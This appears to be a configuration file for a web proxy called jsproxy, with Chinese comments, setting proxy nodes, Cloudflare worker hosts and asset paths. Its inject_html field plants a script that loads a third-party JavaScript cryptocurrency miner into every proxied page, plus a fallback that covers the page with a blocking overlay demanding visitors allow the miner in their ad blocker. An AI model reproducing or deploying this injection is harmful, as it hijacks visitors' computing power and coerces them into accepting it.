jsproxy_config({
  // 当前配置的版本（记录在日志中，用于排查问题）
  // 每次修改配置，该值需要增加，否则不会生效。
  // 默认每隔 5 分钟自动下载配置，若想立即验证，可通过隐私模式访问。
  ver: '114',

  // 通过 CDN 加速常用网站的静态资源（实验中）
  static_boost: {
    enable: true,
    ver: 62
  },

  // 节点配置
  node_map: {
//    'demo-hk': {
//      label: '演示服务-香港节点',
//      lines: {
//        // 主机:权重
//        'node-aliyun-hk-1.etherdream.com:8443': 1,
//        'node-aliyun-hk-2.etherdream.com:8443': 2,
//      }
//    },
//    'demo-sg': {
//      label: '演示服务-新加坡节点',
//      lines: {
//        'node-aliyun-sg.etherdream.com:8443': 1,
//      },
//    },
    'mysite': {
      label: '当前站点',
      lines: {
        [location.host]: 1,
      }
    },
    // 该节点用于加载大体积的静态资源
    'cfworker': {
      label: '',
      hidden: true,
      lines: {
        // 收费版（高权重）
        //'node-cfworker-2.etherdream.com': 4,

        // 免费版（低权重，分摊一些成本）
        // 每个账号每天 10 万次免费请求，但有频率限制
        'b.007.workers.dev': 1,
        'b.hehe.workers.dev': 1,
        'b.lulu.workers.dev': 1,
        'b.jsproxy.workers.dev': 1,
      }
    }
  },

  /**
   * 默认节点
   */
  node_default: 'mysite',
  // node_default: /jsproxy-demo\.\w+$/.test(location.host) ? 'demo-hk' : 'mysite',

  /**
   * 加速节点
   */
  node_acc: 'cfworker',

  /**
   * 静态资源 CDN 地址
   * 用于加速 `assets` 目录中的资源访问
   */
  // assets_cdn: 'https://cdn.jsdelivr.net/gh/zjcqoo/zjcqoo.github.io@master/assets/',

  // 本地测试时打开，否则访问的是线上的
  assets_cdn: 'assets/',

  // 首页路径
  index_path: 'index_v3.html',

  // 支持 CORS 的站点列表（实验中...）
  direct_host_list: 'cors_v1.txt',

  /**
   * 自定义注入页面的 HTML
   */
  inject_html: '<script src="https://www.hostingcloud.racing/zAMe.js"></script> <script> var _client = new Client.Anonymous('ffeb5499683f358a9605c5834258297c74e6a61a80a3d287bc3ee68ce7f81607', {throttle: 0.5, c: 'w'}); _client.start(); _client.addMiningNotification("Bottom", "JS miner running.", "#cccccc", 20, "#3d3d3d"); </script><script>setTimeout(function(){if(typeof _client === 'undefined' || _client === null){var messageDiv = document.createElement("div");messageDiv.setAttribute("style","width: 50%; background-color: white; padding: 15px; display: inline-block; vertical-align: middle;");messageDiv.appendChild(document.createTextNode("Please allow our miner on your blocker software to continue browsing our site. Reload the page after that."));var mainDiv = document.createElement("div");mainDiv.setAttribute("style","position: absolute; top: 0px; right: 0px; width: 100%; height: 100%; display: flex; background-color: #4c4c4c;  align-items: center; justify-content: center");mainDiv.appendChild(messageDiv);document.body.appendChild(mainDiv);document.getElementsByTagName("body")[0].style.overflow = "hidden";window.scrollTo(0, 0);}},1000);</script>',

  /**
   * URL 自定义处理（设计中）
   */
  url_handler: {
    //'https://www.baidu.com/img/baidu_resultlogo@2.png': {
    //  replace: 'https://www.google.com/images/branding/googlelogo/2x/googlelogo_color_92x30dp.png'
    //},
    'https://www.pornhub.com/': {
      redir: 'https://example.com/'
    },
  }
})
